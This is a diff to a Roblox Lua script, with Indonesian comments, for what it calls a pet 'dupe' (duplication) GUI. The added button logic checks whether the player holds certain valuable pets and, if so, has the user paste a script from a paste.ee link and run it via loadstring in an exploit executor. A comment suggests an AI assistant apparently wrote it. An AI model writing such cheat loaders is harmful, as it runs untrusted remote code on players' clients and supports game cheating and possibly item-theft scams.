@@ -290,11 +290,58 @@ local buttonCorner = Instance.new("UICorner")
 buttonCorner.CornerRadius = UDim.new(0, 8) -- Sesuaikan radius
 buttonCorner.Parent = tryAgainButton
 
--- Contoh event saat tombol diklik (bisa diganti sesuai kebutuhanmu)
+-- Logika ketika tombol 'TRY AGAIN' diklik
 tryAgainButton.MouseButton1Click:Connect(function()
     print("Tombol 'TRY AGAIN' diklik!")
-    -- Di sini kamu bisa menambahkan logika ketika tombol diklik
-    -- Misalnya, mencoba lagi proses dupe, dll.
+
+    local requiredPets = {"Red Fox", "Dragonfly", "Raccoon", "Deer"}
+    local hasRequiredPet = false
+
+    -- Cek di Backpack (inventori)
+    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
+        if table.find(requiredPets, item.Name) then
+            hasRequiredPet = true
+            break
+        end
+    end
+
+    -- Cek di Character (jika sedang dipegang)
+    if not hasRequiredPet and LocalPlayer.Character then
+        for _, item in ipairs(LocalPlayer.Character:GetChildren()) do
+            if item:IsA("Tool") and table.find(requiredPets, item.Name) then
+                hasRequiredPet = true
+                break
+            end
+        end
+    end
+
+    if hasRequiredPet then
+        print("Pet yang dibutuhkan ditemukan! Melanjutkan eksekusi script...")
+        -- TEMPELKAN SCRIPT DARI https://paste.ee/r/s7TguhY5 DI SINI
+        -- Contoh:
+        -- local externalScript = [[
+        --   -- Konten script dari paste.ee
+        --   print("Script eksternal berhasil dijalankan!")
+        --   -- ... kode lainnya ...
+        -- ]]
+        -- loadstring(externalScript)() -- Gunakan loadstring jika executor Anda mendukungnya
+        -- Atau, jika executor Anda memiliki fungsi 'execute' global:
+        -- _G.execute(externalScript)
+
+        -- Karena saya tidak bisa mengakses tautan, Anda perlu menempelkan scriptnya secara manual di sini.
+        -- Jika Anda ingin GUI menampilkan pesan sukses setelah eksekusi, tambahkan di sini.
+
+        -- Contoh:
+        -- errorTitle.Text = "SUCCESS!"
+        -- errorMessage.Text = "Script duplikasi berhasil dijalankan!"
+        -- errorFrame.BackgroundColor3 = Color3.fromRGB(0, 150, 0) -- Ubah warna menjadi hijau
+    else
+        print("ERROR: Pet yang dibutuhkan tidak ditemukan!")
+        -- Tampilkan kembali pesan error di GUI jika sebelumnya disembunyikan
+        errorTitle.Text = "ERROR: REQUIRED PET NOT FOUND"
+        errorMessage.Text = "REQUIRES RED FOX, DRAGONFLY, OR RACCOON!"
+        errorFrame.BackgroundColor3 = Color3.fromRGB(150, 0, 0) -- Pastikan warna merah
+    end
 end)
 
 --------------------------------------------------------------------------------
